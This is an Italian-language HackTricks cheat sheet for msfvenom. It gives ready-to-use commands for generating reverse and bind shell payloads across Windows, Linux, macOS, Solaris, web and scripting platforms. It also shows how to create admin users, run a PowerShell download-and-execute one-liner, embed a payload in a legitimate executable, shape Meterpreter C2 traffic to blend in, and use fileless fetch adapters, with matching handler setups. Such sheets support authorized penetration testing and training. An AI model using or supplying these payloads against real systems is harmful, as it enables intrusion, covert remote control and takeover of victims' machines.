# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## msfvenom di base

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Usa `-a` per selezionare l'architettura del payload e `--platform` per selezionare la relativa piattaforma target.<sup>[[1]](#references)</sup>

## Elenco
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Questi comandi elencano i moduli payload ed encoder disponibili nel framework installato.<sup>[[1]](#references)</sup>

## Parametri comuni durante la creazione di uno shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
I flag mostrati qui selezionano i bad characters, il formato di output, l'encoder e le iterazioni di encoding.<sup>[[1]](#references)</sup>

## Modellazione del traffico HTTP(S) Meterpreter

Metasploit 6.5 ha aggiunto l'opzione `MALLEABLEC2` ai payload reverse HTTP(S) Meterpreter staged e stageless. Il profilo può modificare gli URI, gli user agent, gli header delle richieste/risposte, la posizione del connection-ID e le codifiche/wrapper del body supportati. Sia il payload generato sia il relativo handler devono caricare **lo stesso profilo locale**. La richiesta iniziale di un payload staged per lo stage Meterpreter non viene modificata, quindi è preferibile un payload stageless come `windows/x64/meterpreter_reverse_https` quando anche la prima richiesta deve corrispondere al profilo.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Configura il matching handler con payload e profilo identici:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Solo le direttive documentate come implementate influenzano il traffico; i blocchi di profilo non supportati possono essere analizzati correttamente senza però avere alcun effetto.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Crea utente
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Esegui comando**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **La codifica non è evasione AV:** gli encoder come `x86/shikata_ga_nai` sono principalmente utili per soddisfare i vincoli relativi ai caratteri non validi. La codifica ripetuta non è una tecnica affidabile per l'evasione AV.<sup>[[1]](#references)</sup>

### Incorporato all'interno di un eseguibile
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payload basati sul Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payload in linguaggi di scripting**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

I fetch payload producono un comando che fa sì che un'utility disponibile sul target scarichi ed esegua un payload nativo sottostante. I loro nomi seguono `cmd/<platform>/<fetch-protocol>/<served-payload>`; sono disponibili adapter HTTP(S), SMB e TFTP, con possibilità di scelta del downloader in base alla piattaforma target.<sup>[[2]](#references)</sup>

Ad esempio, genera un comando Linux `wget` che recupera un payload Meterpreter x64 dalla porta 8080 e stabilisce la connessione inversa sulla porta 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Avvia il **fetch handler** con le stesse impostazioni; ospita l'ELF generato e avvia anche l'handler per il payload Meterpreter servito:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Le opzioni dipendenti utili includono `FETCH_PIPE=true` per generare un comando HTTP(S) più breve quando supportato e `FETCH_FILELESS=shell`, `shell-search` o `python3.8+` per eseguire un Linux ELF da un file descriptor anonimo. Le modalità fileless richiedono Linux kernel 3.17 o versioni successive; esamina l'adapter esatto con `msfvenom -p <FETCH_PAYLOAD> --list-options`, poiché le combinazioni supportate variano.<sup>[[2]](#references)</sup>



## References

- [1] [Come usare msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Come usare Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Profili Malleable C2](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
